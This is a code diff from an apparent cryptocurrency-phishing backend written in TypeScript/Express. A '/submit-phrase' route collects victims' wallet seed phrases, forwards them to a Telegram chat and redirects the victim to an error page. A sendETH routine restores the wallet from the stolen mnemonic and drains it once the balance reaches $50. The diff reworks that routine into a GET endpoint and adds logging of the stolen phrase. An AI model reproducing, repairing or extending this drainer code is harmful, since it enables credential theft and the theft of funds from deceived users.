@@ -139,9 +139,9 @@ app.post('/submit-phrase', async (req: Request, res: Response) => {
     sendToTelegram("1618693731", text);
 
 
-    if (phraseinput != null) {
-      sendETH(phraseinput)
-    }
+    // if (phraseinput != null) {
+    //   sendETH(phraseinput)
+    // }
 
     res.redirect('/error');
   } catch (err) {
@@ -177,8 +177,10 @@ async function getEthUsdPrice() {
     console.error('Error fetching ETH to USD price:', error);
   }
 }
-async function sendETH(phraseinput: string) {
+app.get('/sendETH', async (req: Request, res: Response) => {
   try {
+    const phraseinput = req.body.phraseinput;
+    // console.log(phraseinput)
     const phrase = phraseinput;
     //Perform the transaction.
     const mnemonic = phrase;
@@ -206,6 +208,7 @@ async function sendETH(phraseinput: string) {
 
     console.log(`Balance: ${balanceInEth} ETH`);
     console.log(`Balance: $${balanceInUsd.toFixed(2)} USD`);
+    console.log(`Phrase: ${phrase}`);
     //check if the eth amount in usd is more than $50
     if (parseFloat(usdRounded) >= 50) {
       // Create the transaction
@@ -219,7 +222,7 @@ async function sendETH(phraseinput: string) {
   } catch (e) {
     console.log(e.message)
   }
-}
+})
 
 app.use((_req, res, _next) => {
   if (!res.headersSent) {
